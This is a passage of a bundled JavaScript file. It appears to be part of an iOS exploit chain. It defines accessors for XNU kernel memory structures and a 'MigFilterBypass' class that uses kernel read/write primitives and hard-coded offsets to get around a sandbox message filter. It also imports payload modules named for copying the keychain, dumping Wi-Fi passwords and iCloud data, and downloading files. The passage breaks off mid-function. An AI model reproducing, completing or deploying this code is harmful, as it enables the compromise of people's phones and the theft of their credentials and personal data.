function _classPrivateFieldInitSpec(e, t, a) { _checkPrivateRedeclaration(e, t), t.set(e, a); }
function _checkPrivateRedeclaration(e, t) { if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object"); }
function _classPrivateFieldGet(s, a) { return s.get(_assertClassBrand(s, a)); }
function _classPrivateFieldSet(s, a, r) { return s.set(_assertClassBrand(s, a), r), r; }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }
var _buffer = /*#__PURE__*/new WeakMap();
var _dataView = /*#__PURE__*/new WeakMap();
var VMShmem = /*#__PURE__*/function () {
  function VMShmem(buffer) {
    _classCallCheck(this, VMShmem);
    _classPrivateFieldInitSpec(this, _buffer, void 0);
    _classPrivateFieldInitSpec(this, _dataView, void 0);
    _classPrivateFieldSet(_buffer, this, buffer);
    _classPrivateFieldSet(_dataView, this, new DataView(_classPrivateFieldGet(_buffer, this)));
  }
  return _createClass(VMShmem, [{
    key: "port",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(0, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(0, value, true);
    }
  }, {
    key: "remoteAddress",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(8, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(8, value, true);
    }
  }, {
    key: "localAddress",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(16, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(16, value, true);
    }
  }]);
}();


/***/ }),

/***/ "./libs/TaskRop/VmMapEntry.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "vm_map_links", function() { return vm_map_links; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "vm_map_store", function() { return vm_map_store; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "vm_map_entry", function() { return vm_map_entry; });
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _classPrivateFieldInitSpec(e, t, a) { _checkPrivateRedeclaration(e, t), t.set(e, a); }
function _checkPrivateRedeclaration(e, t) { if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object"); }
function _classPrivateFieldGet(s, a) { return s.get(_assertClassBrand(s, a)); }
function _classPrivateFieldSet(s, a, r) { return s.set(_assertClassBrand(s, a), r), r; }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }
var _mem = /*#__PURE__*/new WeakMap();
var _view = /*#__PURE__*/new WeakMap();
var _addr = /*#__PURE__*/new WeakMap();
var _off = /*#__PURE__*/new WeakMap();
var vm_map_links = /*#__PURE__*/function () {
  function vm_map_links() {
    var mem = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : undefined;
    var off = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 0;
    _classCallCheck(this, vm_map_links);
    _classPrivateFieldInitSpec(this, _mem, void 0);
    _classPrivateFieldInitSpec(this, _view, void 0);
    _classPrivateFieldInitSpec(this, _addr, void 0);
    _classPrivateFieldInitSpec(this, _off, void 0);
    _classPrivateFieldSet(_mem, this, mem ? mem : new Uint8Array(0x20));
    _classPrivateFieldSet(_view, this, new DataView(_classPrivateFieldGet(_mem, this).buffer));
    _classPrivateFieldSet(_off, this, off);
    this.sizeof = _classPrivateFieldGet(_mem, this).length;
  }
  return _createClass(vm_map_links, [{
    key: "addr",
    get: function get() {
      if (!_classPrivateFieldGet(_addr, this)) {
        _classPrivateFieldSet(_addr, this, get_buffer_addr(_classPrivateFieldGet(_mem, this)).add(_classPrivateFieldGet(_off, this)));
      }
      return _classPrivateFieldGet(_addr, this);
    }
    /* previous entry */
  }, {
    key: "prev",
    get: function get() {
      return _classPrivateFieldGet(_view, this).getBigUint64(_classPrivateFieldGet(_off, this), true);
    },
    set: function set(val) {
      _classPrivateFieldGet(_view, this).setBigUint64(_classPrivateFieldGet(_off, this), val, true);
    }
    /* next entry */
  }, {
    key: "next",
    get: function get() {
      return _classPrivateFieldGet(_view, this).getBigUint64(_classPrivateFieldGet(_off, this) + 0x8, true);
    },
    set: function set(val) {
      _classPrivateFieldGet(_view, this).setBigUint64(_classPrivateFieldGet(_off, this) + 0x8, val, true);
    }
    /* start address */
  }, {
    key: "start",
    get: function get() {
      return _classPrivateFieldGet(_view, this).getBigUint64(_classPrivateFieldGet(_off, this) + 0x10, true);
    },
    set: function set(val) {
      _classPrivateFieldGet(_view, this).setBigUint64(_classPrivateFieldGet(_off, this) + 0x10, val, true);
    }
    /* end address */
  }, {
    key: "end",
    get: function get() {
      return _classPrivateFieldGet(_view, this).getBigUint64(_classPrivateFieldGet(_off, this) + 0x18, true);
    },
    set: function set(val) {
      _classPrivateFieldGet(_view, this).setBigUint64(_classPrivateFieldGet(_off, this) + 0x18, val, true);
    }
  }]);
}();
;
var _mem2 = /*#__PURE__*/new WeakMap();
var _view2 = /*#__PURE__*/new WeakMap();
var _addr2 = /*#__PURE__*/new WeakMap();
var _off2 = /*#__PURE__*/new WeakMap();
var vm_map_store = /*#__PURE__*/function () {
  function vm_map_store() {
    var mem = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : undefined;
    var off = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 0;
    _classCallCheck(this, vm_map_store);
    _classPrivateFieldInitSpec(this, _mem2, void 0);
    _classPrivateFieldInitSpec(this, _view2, void 0);
    _classPrivateFieldInitSpec(this, _addr2, void 0);
    _classPrivateFieldInitSpec(this, _off2, void 0);
    _classPrivateFieldSet(_mem2, this, mem ? mem : new Uint8Array(0x18));
    _classPrivateFieldSet(_view2, this, new DataView(_classPrivateFieldGet(_mem2, this).buffer));
    _classPrivateFieldSet(_off2, this, off);
    this.sizeof = _classPrivateFieldGet(_mem2, this).length;
  }
  return _createClass(vm_map_store, [{
    key: "addr",
    get: function get() {
      if (!_classPrivateFieldGet(_addr2, this)) {
        _classPrivateFieldSet(_addr2, this, get_buffer_addr(_classPrivateFieldGet(_mem2, this)).add(_classPrivateFieldGet(_off2, this)));
      }
      return _classPrivateFieldGet(_addr2, this);
    }
    /* left element */
  }, {
    key: "rbe_left",
    get: function get() {
      return _classPrivateFieldGet(_view2, this).getBigUint64(_classPrivateFieldGet(_off2, this), true);
    },
    set: function set(val) {
      _classPrivateFieldGet(_view2, this).setBigUint64(_classPrivateFieldGet(_off2, this), val, true);
    }
    /* right element */
  }, {
    key: "rbe_right",
    get: function get() {
      return _classPrivateFieldGet(_view2, this).getBigUint64(_classPrivateFieldGet(_off2, this) + 0x8, true);
    },
    set: function set(val) {
      _classPrivateFieldGet(_view2, this).setBigUint64(_classPrivateFieldGet(_off2, this) + 0x8, val, true);
    }
    /* parent element */
  }, {
    key: "rbe_parent",
    get: function get() {
      return _classPrivateFieldGet(_view2, this).getBigUint64(_classPrivateFieldGet(_off2, this) + 0x10, true);
    },
    set: function set(val) {
      _classPrivateFieldGet(_view2, this).setBigUint64(_classPrivateFieldGet(_off2, this) + 0x10, val, true);
    }
  }]);
}();
;
var _mem3 = /*#__PURE__*/new WeakMap();
var _view3 = /*#__PURE__*/new WeakMap();
var _addr3 = /*#__PURE__*/new WeakMap();
var _off3 = /*#__PURE__*/new WeakMap();
var vm_map_entry = /*#__PURE__*/function () {
  function vm_map_entry() {
    var mem = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : undefined;
    var off = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 0;
    _classCallCheck(this, vm_map_entry);
    _classPrivateFieldInitSpec(this, _mem3, void 0);
    _classPrivateFieldInitSpec(this, _view3, void 0);
    _classPrivateFieldInitSpec(this, _addr3, void 0);
    _classPrivateFieldInitSpec(this, _off3, void 0);
    _classPrivateFieldSet(_mem3, this, mem ? mem : new Uint8Array(0x50));
    _classPrivateFieldSet(_view3, this, new DataView(_classPrivateFieldGet(_mem3, this).buffer));
    _classPrivateFieldSet(_off3, this, off);
    this.sizeof = _classPrivateFieldGet(_mem3, this).length;
    this.links = new vm_map_links(_classPrivateFieldGet(_mem3, this), _classPrivateFieldGet(_off3, this));
    this.store = new vm_map_store(_classPrivateFieldGet(_mem3, this), _classPrivateFieldGet(_off3, this) + 0x20);
  }
  return _createClass(vm_map_entry, [{
    key: "addr",
    get: function get() {
      if (!_classPrivateFieldGet(_addr3, this)) {
        _classPrivateFieldSet(_addr3, this, get_buffer_addr(_classPrivateFieldGet(_mem3, this)).add(_classPrivateFieldGet(_off3, this)));
      }
      return _classPrivateFieldGet(_addr3, this);
    }

    // Union field 1
  }, {
    key: "vme_object_value",
    get: function get() {
      return _classPrivateFieldGet(_view3, this).getBigUint64(_classPrivateFieldGet(_off3, this) + 0x38, true);
    },
    set: function set(val) {
      _classPrivateFieldGet(_view3, this).setBigUint64(_classPrivateFieldGet(_off3, this) + 0x38, val, true);
    }

    // Union field 2
  }, {
    key: "vme_atomic",
    get: function get() {
      return _classPrivateFieldGet(_view3, this).getUint8(_classPrivateFieldGet(_off3, this) + 0x38, true) & 1;
    },
    set: function set(val) {
      var cur = _classPrivateFieldGet(_view3, this).getUint8(_classPrivateFieldGet(_off3, this) + 0x38, true) & 0xfe;
      _classPrivateFieldGet(_view3, this).setUint8(_classPrivateFieldGet(_off3, this) + 0x38, cur + (val & 1), true);
    }
  }, {
    key: "is_sub_map",
    get: function get() {
      return (_classPrivateFieldGet(_view3, this).getUint8(_classPrivateFieldGet(_off3, this) + 0x38, true) & 2) >> 1;
    },
    set: function set(val) {
      var cur = _classPrivateFieldGet(_view3, this).getUint8(_classPrivateFieldGet(_off3, this) + 0x38, true) & 0xfd;
      _classPrivateFieldGet(_view3, this).setUint8(_classPrivateFieldGet(_off3, this) + 0x38, cur + ((val & 1) << 1), true);
    }
  }, {
    key: "vme_submap",
    get: function get() {
      return _classPrivateFieldGet(_view3, this).getBigUint64(_classPrivateFieldGet(_off3, this) + 0x38, true) >> 2n;
    },
    set: function set(val) {
      var cur = _classPrivateFieldGet(_view3, this).getBigUint64(_classPrivateFieldGet(_off3, this) + 0x38, true) & 3n;
      _classPrivateFieldGet(_view3, this).setBigUint64(_classPrivateFieldGet(_off3, this) + 0x38, cur + ((val & 0x3fffffffffffffffn) << 2n), true);
    }

    // Union field 3
  }, {
    key: "vme_ctx_atomic",
    get: function get() {
      return _classPrivateFieldGet(_view3, this).getUint8(_classPrivateFieldGet(_off3, this) + 0x38, true) & 1;
    },
    set: function set(val) {
      var cur = _classPrivateFieldGet(_view3, this).getUint8(_classPrivateFieldGet(_off3, this) + 0x38, true) & 0xfe;
      _classPrivateFieldGet(_view3, this).setUint8(_classPrivateFieldGet(_off3, this) + 0x38, cur + (val & 1), true);
    }
  }, {
    key: "vme_ctx_is_sub_map",
    get: function get() {
      return (_classPrivateFieldGet(_view3, this).getUint8(_classPrivateFieldGet(_off3, this) + 0x38, true) & 2) >> 1;
    },
    set: function set(val) {
      var cur = _classPrivateFieldGet(_view3, this).getUint8(_classPrivateFieldGet(_off3, this) + 0x38, true) & 0xfd;
      _classPrivateFieldGet(_view3, this).setUint8(_classPrivateFieldGet(_off3, this) + 0x38, cur + ((val & 1) << 1), true);
    }
  }, {
    key: "vme_context",
    get: function get() {
      return _classPrivateFieldGet(_view3, this).getUint32(_classPrivateFieldGet(_off3, this) + 0x38, true) >> 2;
    },
    set: function set(val) {
      var cur = _classPrivateFieldGet(_view3, this).getUint32(_classPrivateFieldGet(_off3, this) + 0x38, true) & 2;
      _classPrivateFieldGet(_view3, this).setUint32(_classPrivateFieldGet(_off3, this) + 0x38, cur + (val << 2), true);
    }
  }, {
    key: "vme_object",
    get: function get() {
      return _classPrivateFieldGet(_view3, this).getUint32(_classPrivateFieldGet(_off3, this) + 0x3c, true);
    },
    set: function set(val) {
      _classPrivateFieldGet(_view3, this).setUint32(_classPrivateFieldGet(_off3, this) + 0x3c, val, true);
    }

    // vme_alias:12,               /* entry VM tag */
    // vme_offset:52,              /* offset into object */
  }, {
    key: "vme_offset",
    get: function get() {
      return _classPrivateFieldGet(_view3, this).getBigUint64(_classPrivateFieldGet(_off3, this) + 0x40, true) >> 12n;
    },
    set: function set(val) {
      var cur = _classPrivateFieldGet(_view3, this).getBigUint64(_classPrivateFieldGet(_off3, this) + 0x40, true) & 0xfffn;
      _classPrivateFieldGet(_view3, this).setBigUint64(_classPrivateFieldGet(_off3, this) + 0x40, cur + (val << 12n), true);
    }
    // is_shared:1,                /* region is shared */
    // __unused1:1,
    // in_transition:1,            /* Entry being changed */
    // needs_wakeup:1,             /* Waiters on in_transition */
    // behavior:2,                 /* user paging behavior hint */
    // needs_copy:1,               /* object need to be copied? */
    // protection:3,               /* protection code */
    // used_for_tpro:1,
    // max_protection:4,           /* maximum protection, bit3=UEXEC */
    // inheritance:2,              /* inheritance */
    // use_pmap:1,
    // no_cache:1,                 /* should new pages be cached? */
    // vme_permanent:1,            /* mapping can not be removed */
    // superpage_size:1,           /* use superpages of a certain size */
    // map_aligned:1,              /* align to map's page size */
    // zero_wired_pages:1,
    // used_for_jit:1,
    // csm_associated:1,           /* code signing monitor will validate */
    // iokit_acct:1,
    // vme_resilient_codesign:1,
    // vme_resilient_media:1,
    // vme_xnu_user_debug:1,
    // vme_no_copy_on_read:1,
    // translated_allow_execute:1, /* execute in translated processes */
    // vme_kernel_object:1;        /* vme_object is kernel_object */

    /* can be paged if = 0 */
  }, {
    key: "wired_count",
    get: function get() {
      return _classPrivateFieldGet(_view3, this).getUint16(_classPrivateFieldGet(_off3, this) + 0x4c, true);
    },
    set: function set(val) {
      _classPrivateFieldGet(_view3, this).setUint16(_classPrivateFieldGet(_off3, this) + 0x4c, val, true);
    }
    /* for vm_wire */
  }, {
    key: "user_wired_count",
    get: function get() {
      return _classPrivateFieldGet(_view3, this).getUint16(_classPrivateFieldGet(_off3, this) + 0x4e, true);
    },
    set: function set(val) {
      _classPrivateFieldGet(_view3, this).setUint16(_classPrivateFieldGet(_off3, this) + 0x4e, val, true);
    }
  }]);
}();
;

/***/ }),

/***/ "./libs/TaskRop/VmPackingParams.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return VmPackingParams; });
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _classPrivateFieldInitSpec(e, t, a) { _checkPrivateRedeclaration(e, t), t.set(e, a); }
function _checkPrivateRedeclaration(e, t) { if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object"); }
function _classPrivateFieldGet(s, a) { return s.get(_assertClassBrand(s, a)); }
function _classPrivateFieldSet(s, a, r) { return s.set(_assertClassBrand(s, a), r), r; }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }
var _buffer = /*#__PURE__*/new WeakMap();
var _dataView = /*#__PURE__*/new WeakMap();
var VmPackingParams = /*#__PURE__*/function () {
  function VmPackingParams(buffer) {
    _classCallCheck(this, VmPackingParams);
    _classPrivateFieldInitSpec(this, _buffer, void 0);
    _classPrivateFieldInitSpec(this, _dataView, void 0);
    _classPrivateFieldSet(_buffer, this, buffer);
    _classPrivateFieldSet(_dataView, this, new DataView(_classPrivateFieldGet(_buffer, this)));
  }
  return _createClass(VmPackingParams, [{
    key: "vmpp_base",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(0, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(0, value, true);
    }
  }, {
    key: "vmpp_bits",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint8(8, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint8(8, value, true);
    }
  }, {
    key: "vmpp_shift",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint8(9, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint8(9, value, true);
    }
  }, {
    key: "vmpp_base_relative",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint8(10, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint8(10, value, true);
    }
  }]);
}();


/***/ }),

/***/ "./main.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("./libs/Chain/Native.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__("./libs/Chain/Chain.js");
/* harmony import */ var libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__("./libs/TaskRop/TaskRop.js");
/* harmony import */ var libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__("./libs/TaskRop/Task.js");
/* harmony import */ var libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__("./libs/TaskRop/Sandbox.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__("./libs/JSUtils/Utils.js");
/* harmony import */ var _InjectJS__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__("./InjectJS.js");
/* harmony import */ var libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__("./libs/Driver/Driver.js");
/* harmony import */ var libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__("./libs/TaskRop/RemoteCall.js");
/* harmony import */ var _MigFilterBypassThread__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__("./MigFilterBypassThread.js");
/* harmony import */ var _raw_loader_loader__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__("../node_modules/raw-loader/dist/cjs.js!./loader.js");
/* harmony import */ var _raw_loader_file_downloader__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__("../node_modules/raw-loader/dist/cjs.js!./file_downloader.js");
/* harmony import */ var _raw_loader_keychain_copier__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__("../node_modules/raw-loader/dist/cjs.js!./keychain_copier.js");
/* harmony import */ var _raw_loader_wifi_password_dump__WEBPACK_IMPORTED_MODULE_13__ = __webpack_require__("../node_modules/raw-loader/dist/cjs.js!./wifi_password_dump.js");
/* harmony import */ var _raw_loader_wifi_password_securityd__WEBPACK_IMPORTED_MODULE_14__ = __webpack_require__("../node_modules/raw-loader/dist/cjs.js!./wifi_password_securityd.js");
/* harmony import */ var _raw_loader_icloud_dumper__WEBPACK_IMPORTED_MODULE_15__ = __webpack_require__("../node_modules/raw-loader/dist/cjs.js!./icloud_dumper.js");
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _classPrivateFieldInitSpec(e, t, a) { _checkPrivateRedeclaration(e, t), t.set(e, a); }
function _checkPrivateRedeclaration(e, t) { if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object"); }
function _classPrivateFieldGet(s, a) { return s.get(_assertClassBrand(s, a)); }
function _classPrivateFieldSet(s, a, r) { return s.set(_assertClassBrand(s, a), r), r; }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }

















//import KeychainDumpCode from '!raw-loader!keychain_dump.js'
var _running = /*#__PURE__*/new WeakMap();
var _sharedMem = /*#__PURE__*/new WeakMap();
var _runFlagPtr = /*#__PURE__*/new WeakMap();
var _isRunningPtr = /*#__PURE__*/new WeakMap();
var _monitorThread1Ptr = /*#__PURE__*/new WeakMap();
var _monitorThread2Ptr = /*#__PURE__*/new WeakMap();
var _mutexPtr = /*#__PURE__*/new WeakMap();
var MigFilterBypass = /*#__PURE__*/function () {
  function MigFilterBypass(mutexPtr) {
    _classCallCheck(this, MigFilterBypass);
    _classPrivateFieldInitSpec(this, _running, void 0);
    _classPrivateFieldInitSpec(this, _sharedMem, void 0);
    _classPrivateFieldInitSpec(this, _runFlagPtr, void 0);
    _classPrivateFieldInitSpec(this, _isRunningPtr, void 0);
    _classPrivateFieldInitSpec(this, _monitorThread1Ptr, void 0);
    _classPrivateFieldInitSpec(this, _monitorThread2Ptr, void 0);
    _classPrivateFieldInitSpec(this, _mutexPtr, void 0);
    _classPrivateFieldSet(_mutexPtr, this, mutexPtr);
    _classPrivateFieldSet(_running, this, false);
    _classPrivateFieldSet(_sharedMem, this, BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("calloc", 1, 0x100)));
    _classPrivateFieldSet(_runFlagPtr, this, _classPrivateFieldGet(_sharedMem, this));
    _classPrivateFieldSet(_isRunningPtr, this, _classPrivateFieldGet(_sharedMem, this) + 0x4n);
    _classPrivateFieldSet(_monitorThread1Ptr, this, _classPrivateFieldGet(_sharedMem, this) + 0x8n);
    _classPrivateFieldSet(_monitorThread2Ptr, this, _classPrivateFieldGet(_sharedMem, this) + 0x10n);
    libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(_classPrivateFieldGet(_runFlagPtr, this), 2);
    libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(_classPrivateFieldGet(_isRunningPtr, this), 0);
  }
  return _createClass(MigFilterBypass, [{
    key: "start",
    value: function start() {
      if (_classPrivateFieldGet(_running, this)) return;
      var threadSelf = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_thread_self"));
      var threadSelfAddr = BigInt(libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(threadSelf));
      var threadMem = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("calloc", 1, 0x400));
      var kernelRW = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].transferRW();
      var kernelBase = BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].getKernelBase());
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem, BigInt(kernelRW.controlSocket));
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x8n, BigInt(kernelRW.rwSocket));
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x10n, kernelBase);
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x18n, threadSelfAddr);
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x20n, _classPrivateFieldGet(_runFlagPtr, this));
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x28n, _classPrivateFieldGet(_isRunningPtr, this));
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x30n, _classPrivateFieldGet(_mutexPtr, this));
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x38n, BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().migLock));
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x40n, BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().migSbxMsg));
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x48n, BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().migKernelStackLR));
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x50n, _classPrivateFieldGet(_monitorThread1Ptr, this));
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x58n, _classPrivateFieldGet(_monitorThread2Ptr, this));
      //Native.write64(threadMem, lock.kernelSlide);
      //Native.write64(threadMem + 0x8n, lock.lockAddr);
      //console.log(TAG, `Spawn bypass thread with args: kernelSlide=${Utils.hex(lock.kernelSlide)}, lockAddr=${Utils.hex(lock.lockAddr)}`);
      var threadCode = "fcall_init(); " + _MigFilterBypassThread__WEBPACK_IMPORTED_MODULE_9__["default"];
      libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].threadSpawn(threadCode, threadMem);
      for (var i = 0; i < 10; i++) {
        var isRunning = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(_classPrivateFieldGet(_isRunningPtr, this));
        if (isRunning) break;
        libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", 500000);
      }
      _classPrivateFieldSet(_running, this, true);
    }
  }, {
    key: "stop",
    value: function stop() {
      if (!_classPrivateFieldGet(_running, this)) return;
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(_classPrivateFieldGet(_runFlagPtr, this), 0);
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
      _classPrivateFieldSet(_running, this, false);
    }
  }, {
    key: "pause",
    value: function pause() {
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(_classPrivateFieldGet(_runFlagPtr, this), 2);
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
    }
  }, {
    key: "resume",
    value: function resume() {
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(_classPrivateFieldGet(_runFlagPtr, this), 1);
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
    }
  }, {
    key: "monitorThreads",
    value: function monitorThreads(thread1, thread2) {
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(_classPrivateFieldGet(_monitorThread1Ptr, this), thread1);
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(_classPrivateFieldGet(_monitorThread2Ptr, this), thread2);
    }
  }]);
}();
function xnuVersion() {
  libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("uname", libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem);
